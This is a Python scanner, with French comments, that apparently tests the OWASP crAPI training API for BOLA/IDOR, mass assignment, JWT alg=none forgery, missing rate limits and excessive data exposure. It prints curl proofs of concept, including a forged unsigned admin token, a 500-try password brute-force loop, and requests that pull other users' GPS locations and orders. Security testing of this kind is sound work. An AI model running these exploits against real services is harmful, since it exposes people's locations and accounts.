import httpx
import json
import random
import string
from rich.console import Console

console = Console()

class CRAPIScanner:
    def __init__(self, target, token):
        self.target = target.rstrip('/')
        self.token = token
        self.headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        self.vulns = []

    def _get(self, path, headers=None):
        try:
            h = headers if headers else self.headers
            return httpx.get(f"{self.target}{path}", headers=h,
                           timeout=10, verify=False, follow_redirects=True)
        except:
            return None

    def _post(self, path, data, headers=None):
        try:
            h = headers if headers else self.headers
            return httpx.post(f"{self.target}{path}", json=data,
                            headers=h, timeout=10, verify=False)
        except:
            return None

    def add(self, ep, vtype, sev, desc, poc, cvss):
        self.vulns.append({
            'endpoint': ep, 'type': vtype, 'severity': sev,
            'description': desc, 'evidence': desc, 'poc': poc,
            'cvss': cvss, 'owasp': 'API1:2023'
        })
        color = "red bold" if sev == "CRITIQUE" else "red" if sev == "HAUT" else "yellow"
        console.print(f"[{color}][!] {sev} — {vtype} sur {ep} (CVSS:{cvss})[/{color}]")

    def test_bola_community_gps(self):
        """API1 CRITIQUE — vehicleId dans author{} → accès GPS"""
        console.print("[cyan][*] Test BOLA CRITIQUE — Community GPS...[/cyan]")
        r = self._get('/community/api/v2/community/posts/recent')
        if not r or r.status_code != 200:
            return False
        try:
            posts = r.json().get("posts", [])
            console.print(f"[cyan]    {len(posts)} posts analysés[/cyan]")
            for post in posts:
                # vehicleId est dans author{}
                author = post.get("author", {})
                vid = author.get("vehicleid", "")
                email = author.get("email", "inconnu")
                if not vid:
                    continue
                console.print(f"[cyan]    vehicleId: {vid[:20]} → owner: {email}[/cyan]")
                # TEST BOLA
                r2 = self._get(f'/identity/api/v2/vehicle/{vid}/location')
                if r2 and r2.status_code == 200:
                    try:
                        loc = r2.json()
                        lat = loc.get("vehicleLocation", {}).get("latitude", "?")
                        lng = loc.get("vehicleLocation", {}).get("longitude", "?")
                        coords = f"lat={lat}, lng={lng}"
                    except:
                        coords = r2.text[:100]
                    self.add(
                        '/identity/api/v2/vehicle/{uuid}/location',
                        'BOLA/IDOR', 'CRITIQUE',
                        f'BOLA CONFIRMÉ: GPS accessible sans autorisation. '
                        f'Victime: {email} | Coordonnées: {coords}',
                        f'# Étape 1 — Récupérer vehicleId depuis posts publics:\n'
                        f'curl -H "Authorization: Bearer $TOKEN" '
                        f'{self.target}/community/api/v2/community/posts/recent\n\n'
                        f'# Étape 2 — Accéder GPS victime avec notre token:\n'
                        f'curl -H "Authorization: Bearer $TOKEN" '
                        f'{self.target}/identity/api/v2/vehicle/{vid}/location',
                        9.1
                    )
                    return True
        except Exception as e:
            console.print(f"[yellow][~] Erreur: {e}[/yellow]")
        return False

    def test_sensitive_posts(self):
        """API6 HAUT — vehicleId + email exposés dans posts publics"""
        console.print("[cyan][*] Test Sensitive Data — Posts...[/cyan]")
        r = self._get('/community/api/v2/community/posts/recent')
        if not r or r.status_code != 200:
            return False
        try:
            posts = r.json().get("posts", [])
            for post in posts:
                author = post.get("author", {})
                if author.get("vehicleid") and author.get("email"):
                    self.add(
                        '/community/api/v2/community/posts/recent',
                        'SENSITIVE DATA EXPOSURE', 'HAUT',
                        f'vehicleId + email exposés dans posts publics pour {len(posts)} utilisateurs — permet BOLA chain',
                        f'curl -H "Authorization: Bearer $TOKEN" '
                        f'{self.target}/community/api/v2/community/posts/recent'
                        f' | python3 -c "import sys,json; '
                        f'[print(p[\'author\'][\'vehicleid\'],p[\'author\'][\'email\']) '
                        f'for p in json.load(sys.stdin)[\'posts\']]"',
                        7.5
                    )
                    return True
        except:
            pass
        return False

    def test_bola_orders(self):
        """API1 CRITIQUE — BOLA orders par ID numérique"""
        console.print("[cyan][*] Test BOLA — Shop Orders...[/cyan]")
        r_mine = self._get('/workshop/api/v2/shop/orders/all')
        my_ids = set()
        if r_mine and r_mine.status_code == 200:
            try:
                for order in r_mine.json():
                    my_ids.add(str(order.get('id', '')))
            except:
                pass
        for order_id in range(1, 30):
            if str(order_id) in my_ids:
                continue
            r = self._get(f'/workshop/api/v2/shop/orders/{order_id}')
            if r and r.status_code == 200 and len(r.content) > 30:
                self.add(
                    '/workshop/api/v2/shop/orders/{id}',
                    'BOLA/IDOR', 'CRITIQUE',
                    f'Commande #{order_id} accessible sans vérification propriétaire',
                    f'curl -H "Authorization: Bearer $TOKEN" '
                    f'{self.target}/workshop/api/v2/shop/orders/{order_id}',
                    9.1
                )
                return True
        return False

    def test_mass_assignment(self):
        """API3 HAUT — Mass Assignment signup"""
        console.print("[cyan][*] Test Mass Assignment...[/cyan]")
        rand = ''.join(random.choices(string.ascii_lowercase, k=5))
        payload = {
            "name": f"m_{rand}", "email": f"m_{rand}@test.com",
            "number": "1122334455", "password": "Mass1234!",
            "role": "admin", "isAdmin": True, "available_credit": 99999
        }
        r = self._post('/identity/api/auth/signup', payload)
        if r and r.status_code in [200, 201]:
            self.add(
                '/identity/api/auth/signup', 'MASS ASSIGNMENT', 'HAUT',
                'Champs sensibles acceptés sans rejet 400: role, isAdmin, available_credit',
                f"curl -X POST {self.target}/identity/api/auth/signup "
                f"-H 'Content-Type: application/json' -d '{json.dumps(payload)}'",
                7.5
            )
            return True
        return False

    def test_no_ratelimit(self):
        """API4 MOYEN — No Rate Limiting"""
        console.print("[cyan][*] Test Rate Limiting...[/cyan]")
        codes = []
        for i in range(20):
            r = self._post('/identity/api/auth/login',
                {'email': f'b{i}@x.com', 'password': f'w{i}'},
                headers={'Content-Type': 'application/json'})
            if r:
                codes.append(r.status_code)
                if r.status_code == 429:
                    return False
        if 429 not in codes and len(codes) >= 15:
            self.add(
                '/identity/api/auth/login', 'NO RATE LIMITING', 'MOYEN',
                '20 requêtes sans blocage 429 — brute force possible',
                f"for i in $(seq 1 500); do curl -X POST "
                f"{self.target}/identity/api/auth/login "
                f"-d '{{\"email\":\"admin@test.com\",\"password\":\"p$i\"}}'; done",
                5.3
            )
            return True
        return False

    def test_jwt_none(self):
        """API2 CRITIQUE — JWT alg=none"""
        console.print("[cyan][*] Test JWT Algorithm None...[/cyan]")
        fake = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.'
        h = {**self.headers, 'Authorization': f'Bearer {fake}'}
        r = self._get('/identity/api/v2/user/dashboard', headers=h)
        if r and r.status_code == 200 and len(r.content) > 50:
            self.add(
                '/identity/api/v2/user/dashboard',
                'JWT VULNERABILITY', 'CRITIQUE',
                'JWT alg=none accepté — token forgeable sans clé secrète',
                f'curl -H "Authorization: Bearer {fake}" '
                f'{self.target}/identity/api/v2/user/dashboard',
                9.8
            )
            return True
        return False

    def test_excessive_data(self):
        """API6 MOYEN — Excessive Data Exposure dashboard"""
        console.print("[cyan][*] Test Excessive Data...[/cyan]")
        r = self._get('/identity/api/v2/user/dashboard')
        if r and r.status_code == 200:
            try:
                data = r.json()
                exposed = [f for f in [
                    'name','email','number','available_credit',
                    'role','video_id','vehicles'
                ] if f in data]
                if len(exposed) >= 4:
                    self.add(
                        '/identity/api/v2/user/dashboard',
                        'SENSITIVE DATA EXPOSURE', 'MOYEN',
                        f'Trop de champs exposés dans réponse API: {exposed}',
                        f'curl -H "Authorization: Bearer $TOKEN" '
                        f'{self.target}/identity/api/v2/user/dashboard',
                        4.3
                    )
                    return True
            except:
                pass
        return False

    def run(self):
        console.print("\n[magenta bold][*] Scan OWASP crAPI — BOLA + Top 10...[/magenta bold]")
        results = {
            'BOLA GPS':        self.test_bola_community_gps(),
            'BOLA Orders':     self.test_bola_orders(),
            'Sensitive Posts': self.test_sensitive_posts(),
            'Mass Assignment': self.test_mass_assignment(),
            'JWT None':        self.test_jwt_none(),
            'Rate Limit':      self.test_no_ratelimit(),
            'Excessive Data':  self.test_excessive_data(),
        }
        positifs = sum(1 for v in results.values() if v)
        console.print(
            f"[green][+] {len(self.vulns)} vulnérabilités — "
            f"{positifs}/7 tests positifs[/green]"
        )
        return self.vulns
